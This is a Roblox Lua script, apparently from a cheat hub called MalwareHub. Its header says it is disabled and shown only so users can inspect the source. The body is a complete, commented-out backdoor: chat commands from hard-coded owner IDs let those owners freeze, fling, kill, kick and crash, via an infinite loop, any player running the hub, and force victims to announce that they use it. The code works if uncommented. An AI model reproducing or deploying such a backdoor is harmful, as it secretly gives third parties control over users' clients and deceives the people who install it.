-- this is a script that makes some owners of malwarehub control your stuff
-- it's disabled so they can't do shit on you but if you want to check the source it's here:

--[[
local PremUser = {
    1129299423, -- iiTheCaliXx
    2250634441, --LaBeastHk
    243969115, --svoirr
}
local player = game.Players.LocalPlayer
local Players = game.Players


  ------ ........ -----------
  local function commands(msg,plr)
  if DisableMod == false or table.find(PremUser, plr) then
      local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
      local Msg = string.lower(msg)
      local SplitCMD = string.split(Msg,' ')
      local Lower = string.lower(player.Name)
      local Allowed = string.find(Lower, SplitCMD[2])
      if Allowed then
          if string.find(SplitCMD[1], 'm!freeze') then
              player.Character.HumanoidRootPart.Anchored = true
          end
          if string.find(SplitCMD[1], 'm!unfreeze') or string.find(SplitCMD[1], 'm!nofreeze') then
              player.Character.HumanoidRootPart.Anchored = false
          end
          if string.find(SplitCMD[1], 'm!kick') then
              local ISADMIN = table.find(PremUser, player.UserId)
              if not ISADMIN then
                  player:Kick("\n[MALWARE HUB]\nKicked by: "..Mod.Name.."\n[If u think the command was misused you can report it to the Discord server.]")
                  wait(5)
                  while true do end
              end
          end
          if string.find(SplitCMD[1], 'm!bring') then
              player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players:FindFirstChild(Mod.Name).Character.HumanoidRootPart.Position)
          end
          if string.find(SplitCMD[1], 'm!fling') then
              player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
          end
          if string.find(SplitCMD[1], 'm!kill') then
              player.Character:FindFirstChildOfClass("Humanoid"):Destroy()
          end
          if string.find(SplitCMD[1], 'm!sit') then
              player.Character:FindFirstChild("Humanoid").Sit = true
          end
          if string.find(SplitCMD[1], 'm!bug') then
              player:Destroy()
          end
          if string.find(SplitCMD[1], 'm!checkuser') then
            local ISADMIN = table.find(PremUser, player.UserId)
              if not ISADMIN then
                    local args = {[1] = "/w "..Mod.Name.." i'm using MaIwareHub",[2] = "All"}
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
              end
          end
      else
          if string.find(msg, 'm!check cmds') or string.find(msg, 'm!check commands') then
              print("\n---...MalwareHub PREM Commands...---")
              print("\nm!check cmds / m!check commands\nm!check users\nm!checkuser [user]\nm!bring [user]\nm!bug [user]\nm!fling [user]\nm!freeze [user]\nm!unfreeze [user] / m!nofreeze [user]\nm!kick [user]\nm!kill [user]\nm!sit [user]")
              print("\n --..--..--..--..--..--..--..--..-- ")
          end
          if string.find(msg, 'm!check users') then
            local ISADMIN = table.find(PremUser, player.UserId)
              if not ISADMIN then
                    local args = {[1] = "/w "..Mod.Name.." i'm using MaIwareHub",[2] = "All"}
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
              end
          end
      end
  end
  end

  muted = {}
  mutingnew = false 


  Players.PlayerAdded:Connect(function(plr)
  local PREMS = table.find(PremUser, plr.UserId)
  if PREMS then
      plr.CharacterAdded:Connect(function()
          if plr.Name ~= "iiTheCaliXx" and plr.Name ~= "LaBeastHk" then
            plr.Character:WaitForChild("Humanoid").DisplayName = "[Admin]"..plr.Character:FindFirstChild("Humanoid").DisplayName
            else
                plr.Character:WaitForChild("Humanoid").DisplayName = "[Owner]"..plr.Character:FindFirstChild("Humanoid").DisplayName
          end
      end)
  end
  if muteingnew == true then
      if not table.find(muted, plr.Name) then
          table.insert(muted, plr.Name)
          print('automuted ' .. plr.Name)
      end
  end
  end)

  for i,v in pairs(game:GetService('Players'):GetChildren()) do
  local PREMS = table.find(PremUser, v.UserId)
  if PREMS then
      wait(5)
      if v.Name ~= "iiTheCaliXx" and v.Name ~= "LaBeastHk" then
      Players[v.Name].Character:WaitForChild("Humanoid").DisplayName = "[Admin]"..Players[v.Name].Character:FindFirstChild("Humanoid").DisplayName
      Players[v.Name].CharacterAdded:Connect(function()
        Players[v.Name].Character:WaitForChild("Humanoid").DisplayName = "[Admin]"..Players[v.Name].Character:FindFirstChild("Humanoid").DisplayName
      end)
      else
        Players[v.Name].Character:WaitForChild("Humanoid").DisplayName = "[Owner]"..Players[v.Name].Character:FindFirstChild("Humanoid").DisplayName
      Players[v.Name].CharacterAdded:Connect(function()
        Players[v.Name].Character:WaitForChild("Humanoid").DisplayName = "[Owner]"..Players[v.Name].Character:FindFirstChild("Humanoid").DisplayName
      end)
      end
  end
  end
  
local chatevent = game.ReplicatedStorage.DefaultChatSystemChatEvents
chatevent.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
plr = game.Players[""..Table.FromSpeaker..""]
msg = Table.Message
local PREMS = table.find(PremUser, plr.UserId)
if PREMS then
    commands(msg, plr.UserId)
end
end)
]]